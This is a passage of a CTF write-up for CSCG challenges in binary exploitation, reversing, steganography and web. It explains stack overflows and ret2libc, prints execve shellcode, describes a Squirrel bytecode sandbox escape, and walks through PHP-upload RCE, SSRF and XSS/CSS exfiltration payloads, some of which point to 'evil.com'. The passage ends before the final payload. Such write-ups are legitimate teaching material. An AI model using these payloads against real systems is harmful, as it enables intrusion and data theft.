So we place the return address after 264 bytes of rubbish text. Except this rubbish text needs to match with `"Expelliarmus"` via `strcmp`, so we let this 264 bytes be `Expelliarmus` followed by 252 NUL bytes. The resulting code can be seen in [pwn1.py](pwn1.py).

The flag is `CSCG{NOW_PRACTICE_MORE}`.

## Intro to Pwning 2
This is almost exactly the same as before, except for the canary. This means the stack frame looks more like this:
- 255 bytes for the `read_buf` buffer
- 9 padding bytes (for 16-byte alignment due to the canary)
- 8 bytes for the canary
- 8 bytes for the previous frame's `RBP`
- 8 bytes for the return address

This means we want `%39$p` and `%41$p` for the canary and return address respectively. In the same manner as before, we want to change the return address from `dc5` to `b94` (or `b95` for 16-byte stack alignment). The resulting code can be seen in [pwn2.py](pwn2.py).

The flag is `CSCG{NOW_GET_VOLDEMORT}`.

## Intro to Pwning 3
This one is a lot more involved, seeing as we don't have a function that immediately gives us `system("/bin/sh");`. This means that a [return-to-libc attack](https://en.wikipedia.org/wiki/Return-to-libc_attack) is in order here.

The plan of attack here will be along these lines:
- `welcome`: leak canary and pwn3 base address
- `AAAAAAAA`: overwrite return address to return to `welcome`
- `welcome`: leak the libc base address (using knowledge of the pwn3 base address)
- `AAAAAAAA`: return to libc and call `system("/bin/sh")`

The last step in particular requires us to find the following addresses in libc (ubuntu10_amd64/libc62.30-0):
- `puts`: 0x87490 (we will leak `puts` to find the libc base address)
- `system`: 0x554e0
- `"/bin/sh"`: 0x1b6613

As before, the rest is simple bookkeeping to keep our stack in 16-byte alignment etc. The resulting code can be seen in [pwn3.py](pwn3.py).

The flag is `CSCG{VOLDEMORT_DID_NOTHING_WRONG}`.

## ropnop
The concept for this challenge seems simple enough: the entire executable is given write permissions, so we're probably expected to write to it.

The most obvious way to do that is by using the existing line:
```
read(0, buffer, 0x1337);
```
The idea is that if we can set `buffer` to a section of the executable, then we can return to that address and execute arbirary code. The buffer is given by `[rbp-0x10]`, so we just need to find a way to write to `rbp` and jump back here. Fortunately, we have just the ROP gadget we need slightly further down (anything after `ropnop` itself doesn't get its `RETN`s NOPped because the conditional check has changed):

```
134f: 5d        pop rbp   # actually happens as part of 41 5d = pop r13
1350: 41 5e     pop r14
1352: 41 5f     pop r15
1354: c3        retn
```

The return value of `read`, as it happens, is stored to `[rbp-0x18]`, so we cannot set `rbp` to be any earlier than `startAddress+0x18`. `r14` and `r15` will have to be modified as a consequence, but it doesn't really matter. Anyway, let's pick this value of `startAddress+0x18` for `rbp` (which means we need to jump to `startAddress+8`).

This seems simple enough, we have all our ingredients: the start address, a means to overwrite rbp, and a means to jump to where we want. The only concern left is what exactly we want to execute.

We go with the fairly basic syscall. We use [this searchable syscall table](https://filippo.io/linux-syscall-table/) to inform us how to call `execve`. We need `rax=0x3b`, `rdi` to be the filename, and `rsi` and `rdx` are argv and envp respectively and can be set to NULL. This gives us the following assembly:
```
# 08: 48 8d 3d 0b 00 00 00       lea rdi,[rip+0xb]  # 0x1a
# 0f: 6a 3b                      push 0x3b
# 11: 58                         pop rax
# 12: 48 31 f6                   xor rsi,rsi
# 15: 48 31 d2                   xor rdx,rdx
# 18: 0f 05                      syscall
# 1a: 2f 62 69 6e 2f 73 68 00    "bin/sh\0"
```

So that gives us our second payload `b'\x48\x8d\x3d\x0b\0\0\0\x6a\x3b\x58\x48\x31\xf6\x48\x31\xd2\x0f\x05/bin/sh\0'`, and injecting this via the second `read()` gives us the shell access we wanted. The resulting code can be seen in [ropnop.py](ropnop.py).

The flag is `CSCG{s3lf_m0d1fy1ng_c0dez!}`.

## Squirrel as a Service
The challenge here is to find a 0-day exploit in an existing, well-established scripting language called [Squirrel](https://en.wikipedia.org/wiki/Squirrel_(programming_language)). So unlike the previous challenges which were very self-contained, this one involved a lot of research, which included things like:
- Learning the Squirrel language itself and its nuances
- Understanding the functions included in the standard library and how they are grouped
- The different types of Squirrel native objects and how they are stored under the hood
- How the VM handles function calls (closures, stack frames, etc.)
- The compiled bytecode: what each opcode does and what parameters it acts on

The first two of these can learnt from the [official documentation](http://www.squirrel-lang.org/squirreldoc/), but the rest of it is just putting aside a lot of time and effort into grokking the source code. Fortunately, the code itself (even including the standard library) isn't that long, but on the other hand the code is written using very difficult-to-read macros, so there's some mental gymnastics to be had when reading the source.

Anyway, many hours of research later, we basically learn the system inside out, though we will probably only summarise here the main technical details that allow the challenge to be solved.

We make the following assumptions about how the code will need to be solved:
1. The sq.c (frontend taking input from stdin) itself is rock-solid and the exploit is not in this part of the code
2. The exploit will have to come from the bytecode, rather than in the lexical parsing of Squirrel code
3. We will aim to obtain full shell access, rather than just filesystem/file-reading capabilities
4. We probably want to simulate calling the sqstdlib `system()` method as closely as possible, rather than returning-to-libc

As its name suggests, the sqstdlib `system` method does exactly what you expect, so our ultimate aim here _really_ is to invoke `system("/bin/sh")` as Squirrel code. The issue though, is that the systemlib is not registered, so the Squirrel variable `system` is never bound to the native function `_system_system`.

The next best thing then, is to try to recreate this binding. As our research reveals, the Squirrel object that does this is called an `SQNativeClosure`, and has the following 128-byte structure:
```
    0 1 2 3 4 5 6 7 8 9 A B C D E F
   ---------------------------------
00 |  vftable      |  uiRef        | } these first 0x30 bytes
10 |  weakref      |  next         | } are from the parent 
20 |  prev         |  sharedstate  | } class SQCollectable
30 |  nParamsCheck |  vals         |
40 |  size         |  allocated    |
50 |  outervalues  |  nOuterValues |
60 |  env          |  function     |
70 |  type         |  name         |
   ---------------------------------
```

Of particular interest here is `function`, which is in fact a pointer to our native function. There's a specific method signature for such a function (`HSQUIRRELVM -> SQInteger`), but we don't care too much about this since we're not going to be writing any native code; the functions we need will all already exist in `libsqstdlib.so`.

Also, we have chosen to represent the above table as 16-byte aligned for reasons that will make sense shortly, but is basically because the generic object `SQObject` has the 16-byte structure:
```
    0 1 2 3 4 5 6 7 8 9 A B C D E F
   ---------------------------------
00 |  type         | (union) value |
   ---------------------------------
```
There are 18 possible values for `type`, but the main ones we'll need to know are:
- `OT_NULL = 0x1000001` to indicate a null value
- `OT_INTEGER = 0x5000002` to indicate a 64-bit integer
- `OT_STRING = 0x8000010` to indicate a string
- `OT_NATIVECLOSURE = 0x8000200` to indicate a native closure

Anyway, our first idea seems simple enough: Find a function with the same method signature, and change the value of its `function` pointer. For our purposes we choose the `strip` function which strips leading and trailing spaces from a string.

This seems like the bare minimum idea, and if we're lucky enough we can find some Squirrel bytecode that allows us to read and write to arbitrary memory (outside the sandbox of the VM).

As luck would have it, there is such an opcode! I mean, there are probably many such opcodes that can exit the sandbox, but for our purpose (and the rest of the challenge), it turns out we only need one: `OP_MOVE`. This basically reads an `SQObject` (16 bytes) at the `arg1`th index from the current stack frame. Fortunately for us, `arg1` is an arbitrary 32-bit int, and the code never does any bounds-checking.

To be doubly lucky, we find that glibc's `malloc` has some deterministic behaviour. In particular, Squirrel uses a lot of small `malloc`s for everything, and we find that these tend to end up not just near each other, but at deterministic offsets from each other. We didn't investigate the `malloc` source closely, but the idea is likely that it reserves a large block of space at a randomised address, and then within this space it allocates left to right or similar.

Anyway, what this does mean is that on our local machine we can figure out the address of our stack frame in the Squirrel VM as well as the address of the `strip` SQNativeClosure object (via `gdb` or just `printf`s in the code), and this offset will be exactly the same between runs. Not just that, but it will be the same offset on the remote server as well.

So, this first step is actually doable: we can calculate the offset, and read the `strip` SQNativeClosure object at offset 0x60 so that `env | function` is read into our `type | value` SQObject. There's an issue where the value of `env` (which is always zero) doesn't actually correspond with a valid SQObject `type`, so that e.g. we cannot print this value directly. But it turns out that we can just add this object to another SQInteger and it "typecasts" correctly. In this way, we can obtain our native function pointer for `_string_strip`. And because we have the exact binary for the standard library, we thus know where our `_system_system` function lies.

Now, recall that we have absorbed the `strip` function pointer into a typeless SQObject, added it with some offset, and now have an SQInteger with the `system` function pointer. Two problems still remain:
1. We cannot actually inject this value back to the `strip` SQNativeClosure object. We only have an `OP_MOVE` opcode that reads from the stack, but no corresponding one that writes to it. Well, not quite true: there are opcodes that write to the stack, but they generally write to the `arg0`th index, and `arg0` is an 8-bit int which typically doesn't allow us to jump far enough.
2. Even if we manage to write this back into the correct address, the `env` function will be overwritten with `OT_INTEGER = 0x5000002`. This causes the native closure to become invalid basically, and thus never actually call `function`.

This seems irreconcilable from our understanding of it so far, so let's turn to a different angle: what if we create the SQNativeClosure object from scratch?

As even more luck would have it, the standard library has a `blob` object which is basically an array of bytes. And we have access to the `blob` functions as well. As before, the `malloc` offsets are again deterministic here, which is good news.

So the idea is to have a blob which consists of a 16-byte SQObject, pointing to a 128-byte SQNativeClosure that comes immediately after it. So a 144-byte blob that looks liks this:
```
    0 1 2 3 4 5 6 7 8 9 A B C D E F
   ---------------------------------
00 | type=0x8000200|  value=this+8 | <-- points to the SQNativeClosure object below it
   ---------------------------------
10 | vftable=0     | uiRef=2       |
20 | weakref=0     | next=0        |
30 | prev=0        | sharedstate=0 |
40 | nParamsCheck=0| vals=0        |
50 | size=0        | allocated=0   |
60 | outervalues=0 | nOuterValues=0|
70 | env=0         | function      |
80 | type=0        | name=0        |
   ---------------------------------
```
It turns out (from trial-and-error and/or reading the source), that we can set most of the SQNativeClosure fields to NULL. Which is helpful as `blob`s are zero-initialised, so we can do a lot less writing. The non-zero fields are:
- `uiRef`: This is used for reference-counting, and if the count goes to 0 this causes it to get destroyed and some bad stuff happens (probably due to the missing `vftable`). 1 is probably sufficient, but let's just go with 2.
- `function`: Well, this is the pointer to the native function we want called, in this case `_system_system`.

The rest surprisingly can be NULL, including things like the method signature check. I mean, it's possible they might fail when the function returns, or some other side effect, but who cares about that if we've got shell access. Anyway, this works a treat, so let's summarise what we need to do.

### Summary of what needs to be done
1. Create some code that creates a blob of size 144, and find the address of this blob, and consequently its offset from our stack base. It deserves to be mentioned that this offset, while deterministic between runs, does depend on the size of the bytecode we're feeding in. So we need to feed in code of the right "shape", and then come back to this step to fix the offset.
2. Find the `_string_strip` function pointer, as outlined above, to figure out where sqstdlib lies in memory. Use this to calculate the `_system_system` function pointer.
3. Write four 64-bit ints to this blob (at offsets 0x00, 0x08, 0x18, and 0x78)
4. Read an SQObject from the start of this blob using `OP_MOVE` into some variable, let's call this variable `t`
5. Execute `t("cat flag")` and enjoy the flag

Writing bytecode by hand is no mean feat, so instead we compile normal-looking code that uses `OP_LOAD` to load variables, and then later hex edit them in `OP_MOVE`, e.g. if we want `local p = stack[0x1337]`, we compile it first with `local p = 0x1337` then edit the `OP_LOAD` into an `OP_MOVE`.

The following three files are thus created for this challenge (which are probably littered with debug/diagnostic messages):
- [input_to_feed.txt](input_to_feed.txt): the base source code before editing
- [out.cnut](out.cnut): the compiled Squirrel bytecode, after editing the relevant `OP_LOAD`s into `OP_MOVE`s
- [saas.py](saas.py): simple python script that merely pushes out.cnut into the server

The flag is `CSCG{t3chnic4lly_an_0d4y_but_...}`.

<!----------------------------------------- Big Section Separator ------------------------------------------>

# Reverse Engineering

## Intro to Reversing 1

The decompiled code looks pretty clear:
```
if ( !strcmp(buf, "y0u_5h3ll_p455") )
{
    puts("Thats the right password!");
    printf("Flag: %s", &flagBuffer);
}
```

We pass this to the server via
```
echo y0u_5h3ll_p455 | nc hax1.allesctf.net 9600
```

The flag is `CSCG{ez_pz_reversing_squ33zy}`.

## Intro to Reversing 2
As before, the decompiled code is quite clear:
```
v5 = read(0, buf, 0x1FuLL);
buf[v5 - 1] = 0;
for ( i = 0; i < v5 - 1; ++i )
    buf[i] -= 119;
if ( !strcmp(buf, "\xFC\xFD\xEA\xC0\xBA\xEC\xE8\xFD\xFB\xBD\xF7\xBE\xEF\xB9\xFB\xF6\xBD\xC0\xBA\xB9\xF7\xE8\xF2\xFD\xE8\xF2\xFC") )
{
    puts("Thats the right password!");
    printf("Flag: %s", &flagBuffer);
}
```

We write a quick one-liner in LINQPad:
```
string.Concat("\xFC\xFD\xEA\xC0\xBA\xEC\xE8\xFD\xFB\xBD\xF7\xBE\xEF\xB9\xFB\xF6\xBD\xC0\xBA\xB9\xF7\xE8\xF2\xFD\xE8\xF2\xFC".Select(x => (char)(byte)(x + 119)))
```
which outputs `sta71c_tr4n5f0rm4710n_it_is`.

We pass this to the server via
```
echo sta71c_tr4n5f0rm4710n_it_is | nc hax1.allesctf.net 9601
```

The flag is `CSCG{1s_th4t_wh4t_they_c4ll_on3way_transf0rmati0n?}`.

## Intro to Reversing 3

Again, the decompiled code is farily simple:
```
v5 = read(0, buf, 0x1FuLL);
buf[v5 - 1] = 0;
for ( i = 0; i < v5 - 1; ++i )
{
    buf[i] ^= i + 10;
    buf[i] -= 2;
}
if ( !strcmp(buf, "lp`7a<qLw\x1EkHopt(f-f*,o}V\x0F\x15J") )
{
    puts("Thats the right password!");
    printf("Flag: %s", &flagBuffer);
}
```

We write a quick one-liner in LINQPad:
```
string.Concat("lp`7a<qLw\x1EkHopt(f-f*,o}V\x0F\x15J".Select((c, i) => (char)((c + 2) ^ (i + 10))))
```
which outputs `dyn4m1c_k3y_gen3r4t10n_y34h`.

We pass this to the server via
```
echo dyn4m1c_k3y_gen3r4t10n_y34h | nc hax1.allesctf.net 9602
```

The flag is `CSCG{pass_1_g3ts_a_x0r_p4ss_2_g3ts_a_x0r_EVERYBODY_GETS_A_X0R}`.

## reme Part 1

We open up the `ReMe.dll` file in dnSpy. The first flag is simple enough: we edit the `Decrypt` function to print out the value of `ciphertext`, then recompile and run it.

The flag is `CSCG{CanIHazFlag?}`.

## reme Part 2

The second flag is slightly more involved. Basically, there's some self-referencing going on, which makes it difficult to recompile and run it. So when modifying, we have to be careful to make sure any references happen on the original unmodified DLL, which means replacing things like `Assembly.GetExecutingAssembly()` with the original assembly to get the correct bytes. We also output `rawAssembly` to its own DLL for separate analysis.

We find that this inner DLL (aptly named `ReMe_Inner.dll`) basically has a single check:
```
bool flag3 = "CSCG{" + array[0] == "CSCG{n0w" && array[1] == "u" && array[2] == "know" && array[3] == "st4t1c" && array[4] == "and" && Inner.CalculateMD5Hash(array[5]).ToLower() == "b72f3bd391ba731a35708bfd8cd8a68f" && array[6] == "dotNet" && array[7] + "}" == "R3333}";
```

We use a [rainbow table](https://crackstation.net/) to establish that `b72f3bd391ba731a35708bfd8cd8a68f` is the MD5 hash of the string "dynamic".

The flag is `CSCG{n0w_u_know_st4t1c_and_dynamic_dotNet_R3333}`.

## eVMoji

The first step is to decipher all the emoji. This can be done fairly easily from decompiling the eVMoji executable, plus a good understanding of [stack-oriented programming](https://en.wikipedia.org/wiki/Stack-oriented_programming).

| Emoji | 32-bit code | Meaning |
| ----- | ----------- | ------- |
| ‼ | 0x0BC80E2 | push(`top`) |
| ✅| 0x0859CE2 | `OR` the top 2 items |
| ✏| 0x08F9CE2 | print(`ptr`, `len`) |
| ➕| 0x0959EE2 | `top &= 1` |
| ➡| 0x0A19EE2 | `top >>= lit` |
| 🌠| 0xA08C9FF0 | push(`*(int32*)ptr`)
| 💀| 0x80929FF0 | exit() |
| 💪| 0xAA929FF0 | push(`lit`)
| 📖| 0x96939FF0 | input(`ptr`, `len`) |
| 🔀| 0x80949FF0 | `XOR` the top 2 items |
| 🤔| 0x94A49FF0 | if top 2 are equal jump `lit` |
| 🦾 | 0xBEA69FF0 | push(`*(byte*)ptr`) |

We transpile it to C# pseudocode as a first step, with the result in [eVMoji.txt](eVMoji.txt). This makes it much easier to analyse, and we find that there are basically two parts to this:
1. The first part is just a series of XORed bytes, to spell out `n3w_ag3_v1rtu4liz4t1on_`.
2. The second part checks that the CRC32 of your 4-byte sequence is equal to `~0xF40E845E = 0xBF17BA1`. We can use finite field operations to directly calculate our four bytes from this, but since we're lazy we just enumerate all 2<sup>32</sup> possibilities and pick the correct one, which is `l0l?`. This takes under a minute.

The flag is `CSCG{n3w_ag3_v1rtu4liz4t1on_l0l?}`.

<!----------------------------------------- Big Section Separator ------------------------------------------>

# Stegano

## Intro to Stegano 1
The very important first step here is to do lots of googling on stegano CTFs, to learn that `steghide` is a commonly used program for these things. And also to always have a hex editor.

As it so happens, a hex editor quickly shows us the string `alm1ghty_st3g4n0_pls_g1v_fl4g`.

Further, as foreshadowed, there is in fact something hidden in this image via `steghide`. We run the command line

```steghide extract -sf chall1.jpg```

with the above passphrase, and get a `flag.txt` for our efforts.

The flag is `CSCG{Sup3r_s3cr3t_d4t4}`.

## Intro to Stegano 2
A [FotoForensics](http://fotoforensics.com/) analysis of this image reveals that there is a lot of activity in the top-left corner of the image; has it been photoshopped?

![stego2.png](stego2.png)

Indeed, investigating the original image closely suggests that the pattern of lights is quite unusual. A number of ideas spring to mind, but first we try binary, which turns out to be correct.

The flag is `CSCG{a_Fl4g}`.

## Intro to Stegano 3
Unlike the first two challenges, this one's a PNG, which suggests that there's probably information embedded in the lower bits (which would otherwise disappear in a JPG). Indeed, if we just take the low bits of each pixel (per RGB channel), we get the following image:

![stego3.png](stego3.png)

We can just make out the password `s33_m3_1f_y0u_c4n` in there. Again, with a hex editor we find there is a zip file hidden at the end of the PNG. It is passworded, but of course we already have the password which gives us our `flag.txt`.

The flag is `CSCG{H1dden_1n_pla1n_s1ght}`.

## Matrix
This is effectively a combination of the three introductory challenges, plus a bit more.

As we all know from googling, the typical way to hide some information in a WAV file is via its spectrum. Indeed, a quick load into audacity confirms this:

![matrix1.png](matrix1.png)

As always, we suspect that `steghide` is used to hide something. We run the command line

```steghide extract -sf matrix.wav```

with the passphrase `Th3-R3D-P1ll?`, and get `redpill.jpg` for our efforts. With some googling, we find that this image already exists on the internet, and with the same dimensions too! This makes it easy for us to play _Spot the Difference_ between the two images, and we find that (aside from noise) the changes are concentrated entirely in the bottom right hand corner:

![matrix2.jpg](matrix2.jpg)

The green and pink pattern is clearly binary, and we extract the passphrase `n!C3_PW?` from this. Unsurprisingly, the JPG file is also a passworded zip, and we use this password to extract `secret.txt`, which as the following contents:

```6W6?BHW,#BB/FK[?VN@u2e>m8```

Again, having read lots of CTF writeups we find that [Base85](https://en.wikipedia.org/wiki/Ascii85) is a sufficiently common way of encoding text in stego challenges. We use [Cryptii](https://cryptii.com/pipes/ascii85-encoding) to decode this string and obtain the flag.

The flag is `CSCG{St3g4n0_M4s7eR}`.

<!----------------------------------------- Big Section Separator ------------------------------------------>

# Web

## Local Fun Inclusion
This was pretty straightforward: `index.php` seems to include whatever file is given by the `site` parameter, including images. So we can upload a PHP file to be executed there, as long as it also a valid image.

Seems simple enough, we use MSPaint to create 1x1 png file, and append it with PHP code. This works successfully.

Our first input is `<? print_r(glob('*'));`, which returns

```
Array
(
    [0] => css
    [1] => flag.php
    [2] => index.php
    [3] => js
    [4] => upload.php
    [5] => uploads
    [6] => view.php
)
```

This informs us that the flag is probably stored in `flag.php`. We then leak the contents of `flag.php` using the input `<? echo file_get_contents('flag.php');`.

The flag is `CSCG{G3tting_RCE_0n_w3b_is_alw4ys_cool}`.

## StayWoke Shop

We solved two iterations of this challenge: the original release was solved within the first hour, but when doing this writeup we were unable to reproduce the original solution. We were then informed that it was bugfixed a few hours after release, so it was like doing a completely new challenge. We describe both versions below.

### Original Version
Seems simple enough: buy some stuff, add a coupon, remove some stuff, and notice that the coupon's discount hasn't decreased at all! This means you can buy five €1 items, get a €1 discount, then remove four items and effectively buy that item for free.

Now, it's not difficult to have noticed that the products are numbered 2-6. This is particularly obvious when the link to the Coupon brings you to product id 0. Going to product id 1 leads to a flag costing €1337, except that the flag contents are hidden by asterisks. Presumably you need to buy it to see the whole flag. Well, just apply the above trick (buy five flags, apply discount coupon, remove four flags), and *et voila*.

The flag is `CSCG{c00l_k1ds_st4y_@_/home/}`.

### Updated Version
So it turns out that the website was bugged and you weren't supposed to be able to apply the discount coupon on the flag. That changes everything.

We turn our attention to the very obvious attack vector revealed in the page source:
```
<input type="hidden" name="paymentEndpoint" value="http://payment-api:9090">
```

This can't just be for show, so let's try to manipulate its value and see what happens. We try the following values:
- `http://google.com` gives the error `Timeout awaiting 'request' for 5000ms`. This at least confirms that the `paymentEndpoint` value is in fact being used and not just a dummy attribute.
- `google.com` gives the error `Invalid URL: google.com/wallets/accountNumber/balance`. Well, this tells us the URL it was trying to access. But we need the `http` protocol in any case. Let's redirect it to our own endpoint and see if it's sending any other info.
- `http://evil.com` (our own domain) gives the earlier error `Timeout awaiting 'request' for 5000ms`, so it probably isn't able to access the WAN.
- `http://payment-api` gives the error `connect ECONNREFUSED 172.23.0.3:80`, which at least confirms that it's a LAN address.
- `http://payment-api:9090/hax` gives the error `Cannot GET /hax/wallets/accountNumber/balance\n\nTry GETting /help for possible endpoints`. Now we're on to something.
- `http://payment-api:9090/help` doesn't help: `Cannot GET /help/wallets/accountNumber/balance\n\nTry GETting /help for possible endpoints` Since it's a GET request, we can chuck in a `#` to ignore the rest of the URL.
- `http://payment-api:9090/help#` gives the error
```
{"endpoints":[{"method":"GET","path":"/wallets/:id/balance","description":"check wallet balance"},{"method":"GET","path":"/wallets","description":"list all wallets"},{"method":"GET","path":"/help","description":"this help message"}]}
```
Finally, something useful! We probably want to list all wallets now.
- `http://payment-api:9090/wallets#` gives the error `[{"account":"1337-420-69-93dcbbcd","balance":133500}]`.

At this point, we make an educated guess that we can use the account `1337-420-69-93dcbbcd` to purchase up to €1335. We already know from before that we can get a maximum discount of €2 from having €10 worth of goods, so that's exactly what we need to buy the flag. And this turns out to be a resounding success.

The flag, as before, is `CSCG{c00l_k1ds_st4y_@_/home/}`.

## Xmas Shopping Site
This was by far the most time-consuming challenge, even surpassing gems like **M4z3 Runn3r** and **Squirrel as a Service**. Part of the reason was because it's our first experience with XSS, and another was because we found so many paths that we thought would work, but just barely missed the solution by an inch.

Anyway, Stage 1 starts off simple enough. The first thing you want to do is always try to make a javascript alert appear. There's a clear attack vector here where searching for any text makes it appear on the page.

So we start off with the bare minimum: we perform a search for `<script>alert(1)</script>`. Chrome gives us the following error:
> Refused to execute inline script because it violates the following Content Security Policy directive: "default-src 'self' http://*.xss.allesctf.net". Either the 'unsafe-inline' keyword, a hash ('sha256-S8S/VNmXuUuoIR6OhqBqwIiIkuCxXq31hCCHAHnicV8='), or a nonce ('nonce-...') is required to enable inline execution. Note also that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.

This basically means that we cannot use inline javascript. The `default-src` policy also means we cannot make it read a .js file hosted elsewhere. These of course imply that we want to use JSONP injection, and looking through the page source it seems we have just the thing in `items.php`.

So let's test it with the search text `<script src='/items.php?cb=alert(1)'></script>`. Success! We can also look at the the Network tab in chrome to see the JSONP we are actually receiving:
```
alert(1)([{"title": "Weihnachtsbaum", "url": "3.png", "text": "Plastik und voll schön."},{"title": "Christbaumkugel", "url": "1.png", "text": "Rund und bunt."},{"title": "Schlitten", "url": "2.png", "text": "Es ist glatt, er ist schnell!"}])
```

All that seems reasonable. In addition, we can easily set `location.href` to jump to stage 2, so let's jump ahead to stage 2. And this where all the trouble begins.

The objective for stage 2 is clear enough: the flag is in the middle of the page and we want to leak this from the admin. But the solution for it is anything but. Here we explore our thought process.

### Idea 1 - fetch the entire page externally
Since we have full javascript access in Stage 1, why don't we just use some kind of AJAX get / XMLHttpRequest / fetch to simply get the contents of Stage 2 into a string? Then we can leak this string to our own server (let's call this http://evil.com).

Turns out that CORS doesn't allow this. At best we can use `fetch` to send a request, but can only expect an opaque (blank) response. So this idea doesn't work unfortunately.

### Idea 2 - non-javascript HTML injection
Well, it does seem like we'll have to inject some code/javascript into stage 2 after all, so first thing to do is find an attack vector that lets us enter some text into the HTML source. This one's not quite as straightforward as Stage 1, but it shouldn't take too long to discover how `background.js` works: it simply sends a POST request to itself with the body `bg=red` (or green/tree), and when the page is reloaded you get an hidden input element that looks like this:
```
<input type="hidden" id="bg" value="red">
```

This seems simple enough. In particular, we can easily close the quotation mark and angle bracket, and insert arbitrary HTML, e.g. setting bg=`"><script>alert(1)</script>` would give
```
<input type="hidden" id="bg" value=""><script>alert(1)</script>">
```

That makes its way into the HTML source just fine, but now we're hit with a different problem, as reported by Chrome:
> Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'nonce-kk3VoGafsG2whnkRZ4DPjZu7IBY=' 'unsafe-inline' 'strict-dynamic'". Note that 'unsafe-inline' is ignored if either a hash or nonce value is present in the source list.

In plain english, this means that we need a nonce to run our script. However, this nonce changes on each reload so it's impossible for us to inject the correct nonce beforehand.

#### Idea 2a - use an existing nonce
Actually, the nonce does turn up on the next line as in:
```
<input type="hidden" id="bg" value="red">
<script nonce="kk3VoGafsG2whnkRZ4DPjZu7IBY=">
```

So if we manage to make inject out own `<script` tag that consume everything up to the nonce, we could in fact inject some javascript! So a dangling markup injection, e.g. something like
```
<input type="hidden" id="bg" value=""><script src="http://evil.com/evil.js"
<script nonce="kk3VoGafsG2whnkRZ4DPjZu7IBY=">
```
would work because the second `<script` just becomes an attribute and is ignored. However, in practice we were unable to get rid of the closing `">` at the end of the first line. We tried:
- Quotes (of various types). They either swallowed too much or not enough.
- Block comments, like `<!--` or `<![CDATA`. Again, didn't quite work.
- We were hoping to get cause some kind of malformed character encoding to reject the `">`, but didn't find any success here.

While we're not 100% convinced there isn't a successful exploit these lines, we weren't able to find it, so decided to abandon this line of thought.

#### Idea 2b - consume the rest of the page into some kind of object

So the idea here is that certain elements like `textarea` or `iframe` consume everything until its corresponding closing tag (which may not exist, in which case it consumes everything). So something like
```
<input type="hidden" id="bg" value=""><textarea>">
<script nonce="kk3VoGafsG2whnkRZ4DPjZu7IBY=">
```
would place the entire contents of everything below it (including the flag) into a textarea. The problem now changes slightly to: how do we leak this textarea value? We can make it part of a form with a submit button and all, but as far as we can tell it will require some human input (e.g. click a button) to actually send the request. It seems impossible to make the page auto-submit the form without any javascript, so again we had to reject this.

Along a similar train of thought, we tried something like
```
<input type="hidden" id="bg" value=""><iframe src="http://evil.com">">
<script nonce="kk3VoGafsG2whnkRZ4DPjZu7IBY=">
```
where the rest of the page is swallowed by the `iframe` element. Unfortunately, it doesn't leak this value in any way that can be accessed from within the `iframe` itself. Time to look for another attack vector.

#### Idea 2c - CSS exfil

This was the attack vector we thought most promising, and spent countless hours trying to make work. There is a great collection of CSS Injection Primitives at the [Doomsday Vault](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/), but the basic idea is to leak the flag using pure CSS and no javascript. It turns out that CSS is amazingly versatile in what it can do. This is also very promising since we have full ability to inject CSS, either as a `style` element, or a link to our stylesheet.

The usual technique discussed with respect to CSS is attribute exfiltration. As it stands, the flag isn't an attribute, but maybe we could turn it into one? Unfortunately, the flag is too far away from our injection point, and neither single nor double quotes can escape far enough to turn the flag into (a substring of) an attribute.

No matter. There are also text node infiltration techniques described there. There's a few variants of this, and we tried them in very many combinations, but it basically reduces to some combination of these:
1. Using `@font-face` with custom unicode-range. Roughly speaking, we make it load capital A (U+0041) from a different font, capital B (U+0042) from a different font and so on. These fonts will of course be loaded from our own webserver (at http://evil.com), so that we can leak the exact set of characters used in the flag. This actually succeeded: we found that the characters that appeared in the flag was exactly those of `03:>CDGSUZ_acgjlmnrstuy{}` (possibly with duplicates).
2. Timing attacks. This is basically trying to make the fonts get loaded "left to right" so we know the rough order of where the characters appear (up to do duplicates). The idea is that if we can determine the order where each character first appears, we might have something like `CSG{c0ngratZ_yul3DsUmj:>}` from which we might be able to guess the flag. We tried to approach this a few ways but to no avail.
3. Ligature attacks. So, it's possible to make fonts that have oddly specific ligatures, e.g. we could make `CS` appear as an oversized glyph. What this would then do is make the flag overflow its container, so all we need is some way to detect this overflow. Fortunately, the `::-webkit-scrollbar` pseudo-element does exactly this: we can let the scrollbar take a background image from our endpoint, thus leaking us as to whether the glyph appears. If we know that `CS` exists, we can then test the next letter by testing `CSA`, `CSB`, etc. and learn that the next letter is `C`. So we can keep growing out ligature until we get the whole flag. In practice this requires us to make multiple submissions to the admin, but that seems fair game for the challenge (though maybe not in real life). Unfortunately, and this is a huge "unfortunately", the remote client does not have scrollbars! Zero. Nada. Zilch. We never did figure out why this was the case, until a post-mortem conversation with the author revealed that [puppeteer simply ran headless chrome with --hide-scrollbars by default](https://github.com/puppeteer/puppeteer/issues/4747). We never did manage to get this working, and probably lost a dozen manhours just trying to make a scrollbar appear at all on any website.
4. Using `::first-line` as an alternative to scrollbars. The idea is that if we use `overflow-wrap:anywhere` on the flag, we could have some styles apply only on to the first line of the now-multi-line flag. This could be used with the ligature attack perhaps, or the unicode-range one. While the result is "visually" correct (the style does apply only before the wrap point), we couldn't get chrome to be lazy. Any attempt we tried either made chrome leak the entirety of the flag character set, or nothing at all. It's probably reasonable that chrome has to resolve this eagerly, but you'd hope there might be some way to exploit this somehow. But apparently not.
5. One last shot at trying to leak an overflow via bootstrap. We knew that the bootstrap bundle contains popper, which in turn is all about overflow fixing/manipulation. The hope is that if the flag node (or a parent container thereof) was given the right set of classes, the popper javascript would kick in when it detected an overflow and changed it to a different set of classes or something. This is turn would be leaked to our endpoint. We never did find a way to get this working, but the sample space is probably huge enough that it's likely we might have missed something.

Anyway, everything was a massive failure. Except that we knew the set of characters. Could we guess which words would appear? Maybe `m3rry` as in `merry xmas`. But the sample space is still way too huge, so let's not go there.

### Idea 3 - Replacing javascript variables

Having stared at `background.js` countless times throughout the challenge, we honestly thought the way the background was changed was suspicious and highly unusual. Unusual enough that this probably hinted the way in. (Along the same lines, we also suspected if the Stage 1 About (cat) page was hinting anything, but maybe not.) Since `$("#bg").val()` was arbitrary HTML code, we could inject pretty much anything. In fact, because of the `script-dynamic` policy, we could even inject a `<script>` element here that would get executed. But how to replace the `backgrounds` variable?

Then of course, realisation came all at once. We cannot set the `backgrounds` variable by javascript, but we could certainly create an element with the name/id `backgrounds`. It probably conflicts with the later definition, but that can always be commented out (again, the CORS comment was probably a hint screaming at us to use comments). There's probably a restricted set of attributes which automatically turn into member properties, but name and id appear to be two of them. With that in mind, the intended payload would be:

```
